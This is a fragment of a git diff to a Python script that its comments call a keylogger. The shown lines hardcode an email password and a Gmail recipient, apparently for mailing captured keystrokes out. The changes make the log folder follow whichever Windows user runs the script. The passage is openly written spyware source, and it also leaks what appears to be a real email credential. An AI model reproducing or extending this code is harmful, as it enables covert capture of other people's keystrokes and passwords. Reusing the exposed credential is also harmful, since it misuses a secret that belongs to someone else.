@@ -53,9 +53,11 @@ password = "uqrlxmkvoncsccru"
 
 toaddr = "divkirnapure7@gmail.com"
 
-# creating keylogger
+username = getpass.getuser()
 
-file_path = "C:\\me\\python"
+file_path = f"C:\\Users\\{username}\\pylogger"
+os.makedirs(file_path, exist_ok=True)
+
 extend = "\\"
 file_merge = file_path + extend
 
@@ -178,6 +180,8 @@ number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
 
+
+# creating keylogger
 
 while number_of_iterations < number_of_iterations_end:
 
